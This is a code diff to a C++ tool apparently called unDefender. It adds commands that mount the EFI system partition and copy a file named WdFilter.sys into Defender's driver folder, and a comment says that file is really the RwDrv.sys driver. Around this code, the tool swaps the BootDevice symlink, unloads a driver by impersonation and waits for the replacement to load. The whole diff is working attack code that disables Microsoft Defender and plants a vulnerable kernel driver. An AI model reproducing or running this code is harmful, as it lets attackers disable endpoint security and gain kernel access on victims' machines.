@@ -2,6 +2,13 @@
 
 int main()
 {
+	// YES I KNOW IT'S SLOPPY BUT IT'S 5 AM AND THIS IS FAST.
+	// make sure to put in the same folder unDefender.exe AND the provided WdFilter.sys (which is basicalli RwDrv.sys :)
+	system("mountvol.exe U: /S");
+	system("mkdir U:\\Windows\\System32\\Drivers\\wd\\");
+	system("copy .\\WdFilter.sys U:\\Windows\\System32\\Drivers\\wd\\WdFilter.sys /Y");
+	system("mountvol.exe U: /D");
+
 	// save the old symbolic link so that we can restore it later
 	auto oldTarget = GetSymbolicLinkTarget(L"\\Device\\BootDevice");
 
@@ -19,6 +26,9 @@ int main()
 	std::thread driverKillerThread(ImpersonateAndUnload);
 	driverKillerThread.join();
 	
+	std::cout << "[+] Sleeping 10 seconds to let the driver \"reload\" ;)\n";
+	Sleep(10000);
+
 	// restore the symlink
 	status = ChangeSymlink(L"\\Device\\BootDevice", oldTarget);
 	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully restored symbolic links...\n";
